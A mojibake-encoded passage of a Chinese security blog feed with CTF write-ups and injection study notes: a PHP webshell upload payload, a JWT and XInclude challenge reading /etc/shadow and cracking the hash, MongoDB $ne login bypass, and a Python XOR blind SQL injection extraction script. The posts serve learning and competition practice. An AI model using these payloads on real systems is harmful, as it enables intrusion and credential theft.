é€šè¿‡è°·æ­Œå¾—çŸ¥åœ¨linuxç§æ–‡ä»¶åçš„é•¿åº¦æœ€å¤§å¯ä¸º255ä¸ªå­—ç¬¦ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ç§æ–¹å¼è®©å®ƒæŠ¥é”™æ¥å¾—çŸ¥ä»–çš„å€¼ æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä»–çš„å›æ˜¾å‘Šè¯‰æˆ‘ä»¬äº†hashçš„å€¼ï¼Œç„¶åæˆ‘ä»¬å†ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬è®¿é—®å³å¯ã€‚ POSTä¸Šä¼ æ–‡ä»¶çš„è¯·æ±‚ä½“æ¨¡æ¿: 1234567891011121314151617181920212223242526POST / HTTP/2Host: Cache-Control: max-age=0Sec-Ch-Ua: &quot;Chromium&quot;;v=&quot;122&quot;, &quot;Not(A:Brand&quot;;v=&quot;24&quot;, &quot;Google Chrome&quot;;v=&quot;122&quot;Sec-Ch-Ua-Mobile: ?0Sec-Ch-Ua-Platform: &quot;Windows&quot;Upgrade-Insecure-Requests: 1Origin: https://0ad900b10331bc6f843fbff300b80018.web-security-academy.netContent-Type: multipart/form-data; boundary=----WebKitFormBoundarylZktl8pLMuKyOfByUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Sec-Fetch-Site: same-originSec-Fetch-Mode: navigateSec-Fetch-User: ?1Sec-Fetch-Dest: documentAccept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9,en;q=0.8Content-Length: 198------WebKitFormBoundarylZktl8pLMuKyOfByContent-Disposition: form-data; name=&quot;&quot;; filename=&quot;&quot;Content-Type: &lt;?php eval($_POST[&#x27;1&#x27;])?&gt;------WebKitFormBoundarylZktl8pLMuKyOfBy Usernameé¢˜ç›®æç¤ºäº†jwtå¯ä»¥çˆ†ç ´ï¼Œé‚£è¿™é“é¢˜è‚¯å®šå’Œjwtä¼ªé€ æœ‰å…³ã€‚ ç”¨jwt-crackerçˆ†ç ´å¯†é’¥ï¼Œä¸ºmstzt å› ä¸ºæœ‰æ ‡ç­¾ï¼Œæ‰€ä»¥åˆ¤æ–­ä¸ºxxeæ³¨å…¥ï¼Œä½†æ˜¯æ­£å¸¸çš„xxeä»–ä¼šæœ‰è¿‡æ»¤ï¼Œä¸èƒ½å¼•ç”¨ä¸œè¥¿ã€‚å¯ä»¥ä½¿ç”¨XInclude attackå…³äºXInclude attack è¯»å–/app/app.pyæ–‡ä»¶ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118import flaskfrom flask import Flask, render_template, request, url_forimport jwtfrom lxml import etreeimport osimport reimport tempfileapp = Flask(__name__)FLAG = os.environ.get(&#x27;FLAG&#x27;) or &#x27;wcft&#123;fake-flag&#125;&#x27;FLAGUSER_PASSWORD = os.environ.get(&#x27;FLAGUSER_PASSWORD&#x27;) or &#x27;fake-password&#x27;JWT_SECRET = os.environ.get(&#x27;JWT_SECRET&#x27;) or &#x27;secret&#x27;JWT_ALG = &#x27;HS256&#x27;JWT_COOKIE = &#x27;appdata&#x27;@app.route(&#x27;/&#x27;)def root(): return render_template(&quot;index.html&quot;)@app.route(&#x27;/secret-welcome-935734&#x27;, methods=[&#x27;GET&#x27;])def secret_welcome(): # There is a linux user named &#x27;flaguser&#x27; # Login here with that username and their linux password. auth = request.authorization if auth is None or auth.username != &#x27;flaguser&#x27; or auth.password != FLAGUSER_PASSWORD: resp = flask.Response(&#x27;Please provide the right credentials to get the flag&#x27;) resp.headers[&#x27;WWW-Authenticate&#x27;] = &#x27;Basic&#x27; return resp, 401 return f&#x27;Congrats, here is your flag: &#123;FLAG&#125;&#x27;@app.route(&#x27;/welcome&#x27;, methods=[&#x27;GET&#x27;])def welcome(): cookie = request.cookies.get(JWT_COOKIE) if not cookie: return f&#x27;Error: missing &#123;JWT_COOKIE&#125; cookie value&#x27; try: jwtData = jwt.decode(cookie, JWT_SECRET, algorithms=[JWT_ALG]) except: return &#x27;Error: unable to decode JWT cookie&#x27;, 400 data = jwtData[&#x27;data&#x27;] if not data: return &#x27;Error: missing data field from decoded JWT&#x27;, 400 xmlText = str(data) if &#x27;&amp;&#x27; in xmlText: return &#x27;Error: No entity references please&#x27;, 400 if &#x27;%&#x27; in xmlText: return &#x27;Error: No parameter file entities please&#x27;, 400 tmp = tempfile.NamedTemporaryFile() # Open the file for writing. with open(tmp.name, &#x27;w&#x27;) as f: f.write(xmlText) try: parser = etree.XMLParser(resolve_entities=False) xmlDoc = etree.parse(tmp.name, parser=parser) xmlDoc.xinclude() except Exception as e: print(&#x27;XML Error:&#x27;, e) return &#x27;Error: Error parsing XML&#x27;, 400 usernameElement = xmlDoc.find(&#x27;username&#x27;) if usernameElement is None: return &#x27;Error: Missing username element in XML&#x27;, 400 username = usernameElement.text return render_template(&quot;welcome.html&quot;, username=username)@app.route(&#x27;/register&#x27;, methods=[&#x27;POST&#x27;])def register(): username = request.form.get(&#x27;username&#x27;) if not username: return &#x27;Error: username is required&#x27;, 400 username = str(username) if not re.match(&#x27;^[a-z] $&#x27;, username): return &#x27;Error: username must be only lowercase letters&#x27;, 400 if len(username) &lt; 3: return &#x27;Error: username must be at least 3 letters&#x27;, 400 if len(username) &gt; 20: return &#x27;Error: username must be no longer than 20 letters&#x27;, 400 # Useful for chal development # username = &#x27;&lt;xi:include xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot; href=&quot;/app/app.py&quot; parse=&quot;text&quot;/&gt;&#x27; xml = f&#x27;&lt;data&gt;&lt;username&gt;&#123;username&#125;&lt;/username&gt;&lt;/data&gt;&#x27; jwtData = &#123;&quot;data&quot;: xml&#125; cookie = jwt.encode(jwtData, JWT_SECRET, algorithm=JWT_ALG) response = flask.make_response(f&#x27;hello &#123;username&#125;&#x27;) response.set_cookie(JWT_COOKIE, cookie) response.headers[&#x27;location&#x27;] = url_for(&#x27;welcome&#x27;) return response, 302if __name__ == &quot;__main__&quot;: app.run(debug=False) åœ¨è¿™ä¸ªæ–‡ä»¶é‡Œå¯ä»¥å¾—çŸ¥ï¼Œæœ‰ä¸€ä¸ªæ–°çš„è·¯ç”±/secret-welcome-935734åœ¨è¿™é‡Œç™»é™†æˆåŠŸåå¾—åˆ°flagï¼Œç”¨æˆ·åä¸ºflaguserï¼Œå¯†ç æˆ‘ä»¬å¯ä»¥ç”¨xxeè¯»å–/etc/passwdæˆ–è€…/etc/shadowåœ¨shadowä¸­æˆ‘ä»¬å¾—çŸ¥å¯†ç ä¸º$1$hack$BzqsFHqkPjQ2Sn9amFsgN0è¿™ä¸ªå¯ä»¥åˆ©ç”¨hashcatçˆ†ç ´ å…³äºhashcatçš„ç”¨æ³• çˆ†ç ´å‡ºæ¥å¯†ç æ˜¯qqz3ç™»å½•å¾—åˆ°flag","categories":[{"name":"ctf","slug":"ctf","permalink":"https://lvzhouhang.xyz/categories/ctf/"},{"name":"å¤ç›˜","slug":"ctf/å¤ç›˜","permalink":"https://lvzhouhang.xyz/categories/ctf/%E5%A4%8D%E7%9B%98/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://lvzhouhang.xyz/tags/ctf/"}]},{"title":"javaæ³¨å…¥å­¦ä¹ ","slug":"javaæ³¨å…¥å­¦ä¹ ","date":"2024-03-16T12:56:44.000Z","updated":"2025-04-19T13:25:36.797Z","comments":true,"path":"2024/03/16/javaæ³¨å…¥å­¦ä¹ /","permalink":"https://lvzhouhang.xyz/2024/03/16/java%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"JDBCJDBCæ˜¯ä»€ä¹ˆJava DataBase Connectivityï¼ˆJavaè¯­è¨€è¿æ¥æ•°æ®åº“ï¼‰ æ¥å£æˆ–ç±» ä½œç”¨ DriverManagerç±» 1)ç®¡ç†å’Œæ³¨å†Œæ•°æ®åº“é©±åŠ¨2)å¾—åˆ°æ•°æ®åº“è¿æ¥å¯¹è±¡ Connectionæ¥å£ ä¸€ä¸ªè¿æ¥å¯¹è±¡ï¼Œå¯ç”¨äºåˆ›å»ºStatementå’ŒPreparedStatementå¯¹è±¡ Statemenæ¥å£ ä¸€ä¸ªSQLè¯­å¥å¯¹è±¡ï¼Œç”¨äºå°†SQLè¯­å¥å‘é€ç»™æ•°æ®åº“æœåŠ¡å™¨ PreparedStetemenæ¥å£ ä¸€ä¸ªSQLè¯­å¥å¯¹è±¡ï¼Œæ˜¯Statemençš„å­æ¥å£ ResultSetæ¥å£ ç”¨äºå°è£…æ•°æ®åº“æŸ¥è¯¢çš„ç»“æœé›†ï¼Œè¿”å›ç»™æ•°æ®åº“Javaç¨‹åº åŠ è½½å’Œæ³¨å†Œé©±åŠ¨çš„æ–¹æ³• æè¿° Class.forName(æ•°æ®åº“é©±åŠ¨å®ç°ç±») åŠ è½½å’Œæ³¨å†Œæ•°æ®åº“é©±åŠ¨ï¼Œæ•°æ®åº“é©±åŠ¨ç”±mysqlå‚å•†â€com.mysql.jbdc.Driverâ€ PrepareStatementä¼šå¯¹SQLè¯­å¥è¿›è¡Œé¢„ç¼–è¯‘ï¼Œä½†å¦‚æœç›´æ¥é‡‡å–æ‹¼æ¥çš„æ–¹å¼æ„é€ SQLï¼Œæ­¤æ—¶è¿›è¡Œé¢„ç¼–è¯‘ä¹Ÿæ— ç”¨ã€‚ Statementä¸ä¼šå¯¹SQLè¯­å¥è¿›è¡Œé¢„ç¼–è¯‘ã€‚ ä¸¤ç§æ“ä½œéƒ½æ˜¯å› ä¸ºSQLè¯­å¥æ‹¼æ¥å¯¼è‡´çš„SQLæ³¨å…¥ã€‚ MyBatisæ¡†æ¶åœ¨mybatisä¸­çš„ï¼Œä½¿ç”¨#åŒ…è£¹çš„å­—æ®µåœ¨å†…éƒ¨è¿›è¡Œäº†é¢„ç¼–è¯‘å¤„ç†ï¼Œè€Œ$å¹¶æ²¡æœ‰ä½¿ç”¨é¢„ç¼–è¯‘ï¼Œä¹Ÿå°±æ˜¯JDBCä¸­prepareStatementå’ŒStatementçš„åŒºåˆ«ã€‚mybatisçš„sqlè¯­å¥é€šå¸¸æ˜¯å†™åœ¨xmlæ–‡ä»¶ä¸­ã€‚ order by ç›²æ³¨åœ¨SQLä¸­æ˜¯ä¸å…è®¸unionç›´æ¥è·Ÿåœ¨order byåé¢çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥è€ƒè™‘ä½¿ç”¨ç›²æ³¨æˆ–æŠ¥é”™æ³¨å…¥ã€‚ æˆ‘çš„ç†è§£å°±æ˜¯é€šè¿‡order byå°†åˆ—è¿›è¡Œæ’åºï¼Œé€šè¿‡è¿”å›çš„ä¸åŒç»“æœ ä¸¾ä¸ªç®€å•çš„ä¾‹å­: 1234567891011121314151617181920212223MariaDB [test]&gt; select * from user order by (if(substr((select username from user limit 0,1),1,1)=&#x27;1&#x27;,sleep(1),1));+------------------+------------+| username | password |+------------------+------------+| Nakajima Ayato | 9CXLGSEWDO || Mildred Green | r8ZPbvDXBC || Ito Momoe | qao7ysP90D || Lo On Kay | x8rGVqTQqd || Kobayashi Sakura | lYiv7UO8Yo |+------------------+------------+5 rows in set (0.002 sec)MariaDB [test]&gt; select * from user order by (if(substr((select username from user limit 0,1),1,1)=&#x27;N&#x27;,sleep(1),1));+------------------+------------+| username | password |+------------------+------------+| Nakajima Ayato | 9CXLGSEWDO || Mildred Green | r8ZPbvDXBC || Ito Momoe | qao7ysP90D || Lo On Kay | x8rGVqTQqd || Kobayashi Sakura | lYiv7UO8Yo |+------------------+------------+5 rows in set (5.004 sec) å¯ä»¥çœ‹åˆ°ï¼Œå½“ifè¯­å¥æˆç«‹æ—¶è¿”å›çš„æ—¶é—´ä¸º5sï¼Œä½†æ˜¯ä¸æˆç«‹æ—¶ä¸º0.002s è¿™æ˜¯åŸºäºæ—¶é—´çš„ç›²æ³¨ã€‚ è¿˜å¯ä»¥åˆ©ç”¨å…¶å®ƒçš„æ–¹å¼æ¥è¿›è¡Œç›²æ³¨ ä¾‹å¦‚ï¼š 12MariaDB [test]&gt; select * from user order by if(substr((select username from user limit 0,1),1,1)=&#x27;a&#x27;,1,(select host from mysql.user));ERROR 1242 (21000): Subquery returns more than 1 row å¦‚æœifè¯­å¥é”™è¯¯å°±ä¼šè¿”å›ERROR 1242 (21000): Subquery returns more than 1 rowï¼Œå½“ifæˆç«‹æ—¶å°±ä¼šè¿”å›æ­£å¸¸é¡µé¢ï¼Œå¯ä»¥é€šè¿‡è¿”å›çš„æƒ…å†µæ¥åˆ¤æ–­ã€‚ rand()ç›²æ³¨åŸç†å’Œorder byå¤§å·®ä¸å·®ï¼Œå°±æ˜¯rand()ä¼šäº§ç”Ÿä¸€ä¸ª0-1ä¹‹é—´çš„éšæœºæ•°ï¼Œæˆ‘ä»¬ç»™ä¸€ä¸ªå›ºå®šçš„ç§å­å°±ä¼šç”Ÿæˆä¸€ä¸ªå›ºå®šçš„æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬æ§åˆ¶randçš„ç§å­å°±å¯ä»¥é€ æˆæ’åºçš„ç»“æœä¸åŒã€‚ æ¯”å¦‚ï¼š 12345rand(1)rand(0)rand(1=1)rand(lenth(database())=8).... #å’Œ$ç¬¦å·çš„åŒºåˆ«#{} ä½¿ç”¨#{}æ„å‘³ç€ä½¿ç”¨çš„é¢„ç¼–è¯‘çš„è¯­å¥ï¼Œå³åœ¨ä½¿ç”¨jdbcæ—¶çš„preparedStatementï¼Œsqlè¯­å¥ä¸­å¦‚æœå­˜åœ¨å‚æ•°åˆ™ä¼šä½¿ç”¨?ä½œå ä½ç¬¦ï¼Œæˆ‘ä»¬çŸ¥é“è¿™ç§æ–¹å¼å¯ä»¥é˜²æ­¢sqlæ³¨å…¥ï¼Œå¹¶ä¸”åœ¨ä½¿ç”¨#{}æ—¶å½¢æˆçš„sqlè¯­å¥ï¼Œå·²ç»å¸¦æœ‰å¼•å·ï¼Œä¾‹ï¼Œselect * from table1 where id=#{id} åœ¨è°ƒç”¨è¿™ä¸ªè¯­å¥æ—¶æˆ‘ä»¬å¯ä»¥é€šè¿‡åå°çœ‹åˆ°æ‰“å°å‡ºçš„sqlä¸ºï¼šselect * from table1 where id=â€™2â€™ åŠ å…¥ä¼ çš„å€¼ä¸º2.ä¹Ÿå°±æ˜¯è¯´åœ¨ç»„æˆsqlè¯­å¥çš„æ—¶å€™æŠŠå‚æ•°é»˜è®¤ä¸ºå­—ç¬¦ä¸²ã€‚ ${} ä½¿ç”¨${}æ—¶çš„sqlä¸ä¼šå½“åšå­—ç¬¦ä¸²å¤„ç†ï¼Œæ˜¯ä»€ä¹ˆå°±æ˜¯ä»€ä¹ˆï¼Œå¦‚ä¸Šè¾¹çš„è¯­å¥ï¼šselect * from table1 where id=${id} åœ¨è°ƒç”¨è¿™ä¸ªè¯­å¥æ—¶æ§åˆ¶å°æ‰“å°çš„ä¸ºï¼šselect * from table1 where id=2 ï¼Œå‡è®¾ä¼ çš„å‚æ•°å€¼ä¸º2 ä»ä¸Šè¾¹çš„ä»‹ç»å¯ä»¥çœ‹å‡ºè¿™ä¸¤ç§æ–¹å¼çš„åŒºåˆ«ï¼Œæˆ‘ä»¬æœ€å¥½æ˜¯èƒ½ç”¨#{}åˆ™ç”¨å®ƒï¼Œå› ä¸ºå®ƒå¯ä»¥é˜²æ­¢sqlæ³¨å…¥ï¼Œä¸”æ˜¯é¢„ç¼–è¯‘çš„ï¼Œåœ¨éœ€è¦åŸæ ·è¾“å‡ºæ—¶æ‰ä½¿ç”¨${}ï¼Œå¦‚ï¼Œ select * from ${tableName} order by ${id} è¿™é‡Œéœ€è¦ä¼ å…¥è¡¨åå’ŒæŒ‰ç…§å“ªä¸ªåˆ—è¿›è¡Œæ’åº ï¼ŒåŠ å…¥ä¼ å…¥table1ã€id åˆ™è¯­å¥ä¸ºï¼šselect * from table1 order by id å¦‚æœæ˜¯ä½¿ç”¨#{} åˆ™å˜æˆäº†select * from â€˜table1â€™ order by â€˜idâ€™ æˆ‘ä»¬çŸ¥é“è¿™æ ·å°±ä¸å¯¹äº†ã€‚ å¦ï¼Œåœ¨ä½¿ç”¨ä»¥ä¸‹çš„é…ç½®æ—¶ï¼Œå¿…é¡»ä½¿ç”¨#{} 1234&lt;select id=&quot;selectMessageByIdI&quot; parameterType=&quot;int&quot; resultType=&quot;Message&quot;&gt; select * from message where id=#&#123;id&#125;; &lt;/select&gt; åœ¨parameterTypeæ˜¯intæ—¶ï¼Œsqlè¯­å¥ä¸­å¿…é¡»æ˜¯#{}ã€‚ å‚è€ƒé“¾æ¥ å…³äºJavaä¸­order byæ³¨å…¥è¯¦è§£","categories":[{"name":"web","slug":"web","permalink":"https://lvzhouhang.xyz/categories/web/"},{"name":"java","slug":"web/java","permalink":"https://lvzhouhang.xyz/categories/web/java/"}],"tags":[{"name":"web","slug":"web","permalink":"https://lvzhouhang.xyz/tags/web/"},{"name":"sql","slug":"sql","permalink":"https://lvzhouhang.xyz/tags/sql/"}]},{"title":"NoSQLæ³¨å…¥","slug":"NoSQLæ³¨å…¥","date":"2024-03-12T07:28:01.000Z","updated":"2025-04-19T13:25:36.771Z","comments":true,"path":"2024/03/12/NoSQLæ³¨å…¥/","permalink":"https://lvzhouhang.xyz/2024/03/12/NoSQL%E6%B3%A8%E5%85%A5/","excerpt":"","text":"ä»€ä¹ˆæ˜¯NoSQLNoSQLï¼ŒæŒ‡çš„æ˜¯éå…³ç³»å‹çš„æ•°æ®åº“ã€‚NoSQL æœ‰æ—¶ä¹Ÿç§°ä½œ Not Only SQL çš„ç¼©å†™ï¼Œæ˜¯å¯¹ä¸åŒäºä¼ ç»Ÿçš„å…³ç³»å‹æ•°æ®åº“çš„æ•°æ®åº“ç®¡ç†ç³»ç»Ÿçš„ç»Ÿç§°ã€‚NoSQL ç”¨äºè¶…å¤§è§„æ¨¡æ•°æ®çš„å­˜å‚¨ã€‚ï¼ˆä¾‹å¦‚è°·æ­Œæˆ– Facebook æ¯å¤©ä¸ºä»–ä»¬çš„ç”¨æˆ·æ”¶é›†ä¸‡äº¿æ¯”ç‰¹çš„æ•°æ®ï¼‰ã€‚è¿™äº›ç±»å‹çš„æ•°æ®å­˜å‚¨ä¸éœ€è¦å›ºå®šçš„æ¨¡å¼ï¼Œæ— éœ€å¤šä½™æ“ä½œå°±å¯ä»¥æ¨ªå‘æ‰©å±•ã€‚ NoSQL æä¾›äº†æ–°çš„æ•°æ®æ¨¡å‹å’ŒæŸ¥è¯¢æ ¼å¼ï¼Œä»è€Œå¯ä»¥è§„é¿å¸¸è§„çš„ SQL æ³¨å…¥æ”»å‡»ã€‚ä½†æ˜¯ï¼Œå®ƒä»¬ä¹Ÿä¸ºæ”»å‡»è€…æä¾›äº†æ’å…¥æ¶æ„ä»£ç çš„æ–°æ–¹æ³•ã€‚æ€»çš„æ¥è®²æœ‰å››ç§æ³¨å…¥æ‰‹æ³•ï¼š 1ã€é‡è¨€å¼ åˆç§°ä¸ºæ°¸çœŸå¼ï¼ˆè¿™ä¸ªå¥½åƒæ˜¯æ•°ç†é€»è¾‘é‡Œé¢çš„æœ¯è¯­ï¼‰ï¼Œæ­¤ç±»æ”»å‡»æ˜¯åœ¨æ¡ä»¶è¯­å¥ä¸­æ³¨å…¥ä»£ç ï¼Œä½¿ç”Ÿæˆçš„è¡¨è¾¾å¼åˆ¤å®šç»“æœæ°¸è¿œä¸ºçœŸï¼Œä»è€Œç»•è¿‡è®¤è¯æˆ–è®¿é—®æœºåˆ¶ã€‚ 2ã€è”åˆæŸ¥è¯¢ è”åˆæŸ¥è¯¢æ˜¯ä¸€ç§ä¼—æ‰€å‘¨çŸ¥çš„SQLæ³¨å…¥æŠ€æœ¯ï¼Œæ”»å‡»è€…åˆ©ç”¨ä¸€ä¸ªè„†å¼±çš„å‚æ•°å»æ”¹å˜ç»™å®šæŸ¥è¯¢è¿”å›çš„æ•°æ®é›†ã€‚è”åˆæŸ¥è¯¢æœ€å¸¸ç”¨çš„ç”¨æ³•æ˜¯ç»•è¿‡è®¤è¯é¡µé¢è·å–æ•°æ®ã€‚ 3ã€JavaScript æ³¨å…¥ MongoDB Server æ”¯æŒ JavaScriptï¼Œè¿™ä½¿å¾—åœ¨æ•°æ®å¼•æ“è¿›è¡Œå¤æ‚äº‹åŠ¡å’ŒæŸ¥è¯¢æˆä¸ºå¯èƒ½ï¼Œä¼ é€’ä¸å¹²å‡€çš„ç”¨æˆ·è¾“å…¥åˆ°è¿™äº›æŸ¥è¯¢ä¸­å¯ä»¥æ³¨å…¥ä»»æ„ JavaScript ä»£ç ï¼Œå¯¼è‡´éæ³•çš„æ•°æ®è·å–æˆ–ç¯¡æ”¹ã€‚ 4ã€ç›²æ³¨ å½“é¡µé¢æ²¡æœ‰å›æ˜¾æ—¶ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥é€šè¿‡$regexæ­£åˆ™è¡¨è¾¾å¼æ¥è¾¾åˆ°å’Œ SQL æ³¨å…¥ä¸­substr()å‡½æ•°ç›¸åŒçš„åŠŸèƒ½ï¼Œè€Œä¸” NoSQL ç”¨åˆ°çš„åŸºæœ¬ä¸Šéƒ½æ˜¯å¸ƒå°”ç›²æ³¨ã€‚ å¯¹äº PHP æœ¬èº«çš„ç‰¹æ€§è€Œè¨€ï¼Œç”±äºå…¶æ¾æ•£çš„æ•°ç»„ç‰¹æ€§ï¼Œå¯¼è‡´å¦‚æœæˆ‘ä»¬è¾“å…¥value=1é‚£ä¹ˆï¼Œä¹Ÿå°±æ˜¯è¾“å…¥äº†ä¸€ä¸ª value çš„å€¼ä¸º 1 çš„æ•°æ®ã€‚å¦‚æœè¾“å…¥value[$ne]=1ä¹Ÿå°±æ„å‘³ç€value=array($ne=&gt;1),åœ¨ MongoDB ä¸­ï¼ŒåŸæ¥çš„ä¸€ä¸ªå•ä¸ªç›®æ ‡çš„æŸ¥è¯¢å˜æˆäº†æ¡ä»¶æŸ¥è¯¢ã€‚åŒæ ·çš„ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨username[$gt]=&amp;password[$gt]=ä½œä¸º payload è¿›è¡Œæ”»å‡»ã€‚ åœ¨æˆ‘çœ‹æ¥ï¼Œnosqlæ³¨å…¥å°±æ˜¯é€šè¿‡ä¼ å…¥æ•°ç»„ç„¶åæ‹¼æ¥æ¶æ„è¯­å¥é€ æˆæ³¨å…¥ï¼Œå’Œå…¶ä»–æ•°æ®åº“çš„æ³¨å…¥åŸç†ç±»ä¼¼ï¼Œä½†æ˜¯è¯­æ³•æœ‰æ‰€ä¸åŒã€‚ æŸ¥è¯¢æ“ä½œç¬¦ nosqlçš„æŸ¥è¯¢æ“ä½œç¬¦ä¸ç”¨orã€andã€=ç­‰ç­‰ï¼Œå–è€Œä»£ä¹‹çš„æ˜¯$eqã€$neã€$gtç­‰ æ–¹æ³•å æè¿° $gt å¤§äº $lte å°äºç­‰äº $in åŒ…å« $nin ä¸åŒ…å« $lt å°äº $gte å¤§äºç­‰äº $ne ä¸ç­‰äº $eq ç­‰äº $and ä¸ $nor $noråœ¨NORä¸€ä¸ªæˆ–å¤šä¸ªæŸ¥è¯¢è¡¨è¾¾å¼çš„æ•°ç»„ä¸Šæ‰§è¡Œé€»è¾‘è¿ç®—ï¼Œå¹¶é€‰æ‹© å¯¹è¯¥æ•°ç»„ä¸­æ‰€æœ‰æŸ¥è¯¢è¡¨è¾¾å¼éƒ½å¤±è´¥çš„æ–‡æ¡£ $not ååŒ¹é…(1.3.3åŠä»¥ä¸Šç‰ˆæœ¬),å­—æ®µå€¼ä¸åŒ¹é…è¡¨è¾¾å¼æˆ–è€…å­—æ®µå€¼ä¸å­˜åœ¨ $or æˆ– ä¾‹å¦‚ï¼š æˆ‘ä»¬ä¼ å…¥username=admin&amp;password=123456 åç«¯å°±ä¼šå¤„ç†æˆ 1234array(&#x27;username&#x27; =&gt; &#x27;admin&#x27;,&#x27;password&#x27; =&gt; &#x27;123456&#x27;) å¦‚æœæˆ‘ä»¬ä¼ å…¥username[$ne]=1&amp;password[$ne]=1 åç«¯å¤„ç†æˆ 1234array(&#x27;username&#x27; =&gt; array(&#x27;$ne&#x27; =&gt; 1),&#x27;password&#x27; =&gt; array(&#x27;$ne&#x27; =&gt; 1)) æŸ¥è¯¢çš„è¯­å¥å°±ä¼šå˜æˆdb.users.find(&#123;&#39;username&#39;:&#123;$ne:1&#125;, &#39;password&#39;:&#123;$ne:1&#125;&#125;) æ„æ€å°±æ˜¯æŸ¥è¯¢usernameä¸ç­‰äº1ï¼Œpasswordä¸ç­‰äº1çš„ç”¨æˆ· æ­¤å¤–,nosqlè¿˜å¯ä»¥è¿›è¡Œjavascripæ³¨å…¥ ä¾‹å¦‚ï¼šdb.users.find( &#123; $where: function() &#123; return this.username == &#39;admin&#39;; &#125; &#125; ) è¯¥æŸ¥è¯¢è¿”å›åœ¨usersé›†åˆä¸­usernameç­‰äºadminçš„æ‰€æœ‰æ–‡æ¡£ã€‚ å‚è€ƒé“¾æ¥ä»é›¶å­¦ä¹  NoSQL æ³¨å…¥ä¹‹ Mongodb get-started-with-nosql-injection-nosqli","categories":[{"name":"web","slug":"web","permalink":"https://lvzhouhang.xyz/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"https://lvzhouhang.xyz/tags/web/"},{"name":"sql","slug":"sql","permalink":"https://lvzhouhang.xyz/tags/sql/"}]},{"title":"sqlå¼‚æˆ–æ³¨å…¥","slug":"sqlå¼‚æˆ–æ³¨å…¥","date":"2024-03-01T02:03:30.000Z","updated":"2025-04-19T13:25:36.771Z","comments":true,"path":"2024/03/01/sqlå¼‚æˆ–æ³¨å…¥/","permalink":"https://lvzhouhang.xyz/2024/03/01/sql%E5%BC%82%E6%88%96%E6%B3%A8%E5%85%A5/","excerpt":"","text":"sqlå¼‚æˆ–æ³¨å…¥å½“wafè¿‡æ»¤äº†å¾ˆå¤šä¸œè¥¿ï¼Œä½†æ˜¯æ²¡æœ‰è¿‡æ»¤å¼‚æˆ–(^)ç¬¦çš„æ—¶å€™ä½¿ç”¨ã€‚ ä»€ä¹ˆæ˜¯å¼‚æˆ–æ³¨å…¥å¼‚æ­¥æ³¨å…¥è¯´ç®€å•ä¸€ç‚¹å°±æ˜¯åœ¨æ„é€ whereåé¢çš„åˆ¤æ–­æ¡ä»¶æ—¶ä½¿ç”¨^ï¼ˆå¼‚æˆ–ç¬¦å·ï¼‰æ¥è¾¾åˆ°sqlæ³¨å…¥æ”»å‡»çš„ç›®çš„ 1^1=0 1^0=1 å¼‚æˆ–æ³¨å…¥å°±æ˜¯åˆ©ç”¨sqlè¯­å¥æ¥è¿›è¡Œç›²æ³¨ ä¾‹å¦‚ï¼š 1select * from student where Sname=1^(substr(database(),$å˜é‡1$,1)=$å˜é‡2$); è¿™é‡Œå°±æ˜¯çœ‹æ•°æ®åº“çš„ç¬¬å˜é‡1ä¸ªå­—ç¬¦æ˜¯å¦ç­‰äºå˜é‡2ï¼Œå¦‚æœç›¸ç­‰å°±ä¼šå˜æˆ1^1è¿”å›çš„æ˜¯0ï¼Œæ‰€ä»¥æˆ‘ä»¬åº”è¯¥åœ¨æœ€åå†å¼‚æˆ–ä¸€ä¸ª1 1select * from student where Sname=1^(substr(database(),$å˜é‡1$,1)=$å˜é‡2$)^1; è¿™æ ·å¦‚æœæ•°æ®åº“çš„ç¬¬å˜é‡1ä¸ªå­—ç¬¦ç­‰äºå˜é‡2å°±ä¼šè¿”å›1ï¼Œç„¶åå†é…åˆè„šæœ¬å®ç°å¼‚æˆ–æ³¨å…¥ è„šæœ¬: 1234567891011121314151617181920212223242526272829303132333435import requestsimport timeurl = &quot;&quot;pay=&#x27;&#x27;column = &quot;&quot;for i in range(1, 1000): time.sleep(0.06) low = 32 high = 128 mid = (low + high) // 2 while (low &lt; high): # åº“å #temp[&quot;id&quot;] = &quot;1^(ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))&gt;%d)^1&quot; % (i, mid) # è¡¨å # temp[&quot;id&quot;] = &quot;1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))&gt;%d)^1&quot; %(i,mid) # å­—æ®µå # temp[&quot;id&quot;] = &quot;1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;F1naI1y&#x27;)),%d,1))&gt;%d)^1&quot; %(i,mid) # å†…å®¹ pay = &quot;1^(ascii(substr((select(group_concat(password))from(F1naI1y)),%d,1))&gt;%d)^1&quot; %(i,mid) r = requests.get(url+pay) time.sleep(0.04) print(low, high, mid, &quot;:&quot;) if &quot;Click&quot; in r.text: #è‡ªè¡Œæ›´æ”¹è¿”å›å­—ç¬¦ low = mid + 1 else: high = mid mid = (low + high) // 2 if (mid == 32 or mid == 127): break column += chr(mid) print(column)print(&quot;All:&quot;, column)","categories":[{"name":"web","slug":"web","permalink":"https://lvzhouhang.xyz/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"https://lvzhouhang.xyz/tags/web/"},{"name":"sql","slug":"sql","permalink":"https://lvzhouhang.xyz/tags/sql/"}]},{"title":"PHPè¯­æ³•æ„é€ å’Œå˜é‡å‡½æ•°","slug":"PHPè¯­æ³•æ„é€ 